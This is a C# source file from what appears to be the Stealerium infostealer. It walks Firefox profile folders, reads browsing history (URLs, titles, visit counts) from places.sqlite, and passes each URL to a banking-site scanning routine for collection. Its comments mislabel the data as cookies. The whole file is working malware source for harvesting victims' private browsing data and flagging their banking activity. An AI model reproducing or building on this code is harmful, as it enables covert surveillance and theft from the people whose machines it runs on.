using System;
using System.Collections.Generic;
using System.IO;
using Stealerium.Helpers;
using Stealerium.Target.Browsers.Chromium;

namespace Stealerium.Target.Browsers.Firefox
{
    internal class CHistory
    {
        // Get cookies.sqlite file location
        private static string GetHistoryDbPath(string path)
        {
            try
            {
                var dir = path + "\\Profiles";
                if (Directory.Exists(dir))
                    foreach (var sDir in Directory.GetDirectories(dir))
                        if (File.Exists(sDir + "\\places.sqlite"))
                            return sDir + "\\places.sqlite";
            }
            catch (Exception ex)
            {
                Logging.Log("Firefox >> Failed to find history\n" + ex);
            }

            return null;
        }

        // Get cookies from gecko browser
        public static List<Site> Get(string path)
        {
            var scHistory = new List<Site>();
            try
            {
                var sHistoryPath = GetHistoryDbPath(path);

                // Read data from table
                var sSqLite = SqlReader.ReadTable(sHistoryPath, "moz_places");
                if (sSqLite == null)
                    return scHistory;

                for (var i = 0; i < sSqLite.GetRowCount(); i++)
                {
                    var sSite = new Site
                    {
                        Title = Crypto.GetUtf8(sSqLite.GetValue(i, 2)),
                        Url = Crypto.GetUtf8(sSqLite.GetValue(i, 1)),
                        Count = Convert.ToInt32(sSqLite.GetValue(i, 4)) + 1
                    };

                    if (sSite.Title == "0") continue;
                    // Analyze value
                    Banking.ScanData(sSite.Url);
                    Counter.History++;
                    scHistory.Add(sSite);
                }
            }
            catch (Exception ex)
            {
                Logging.Log("Firefox >> history collection failed\n" + ex);
            }

            return scHistory;
        }
    }
}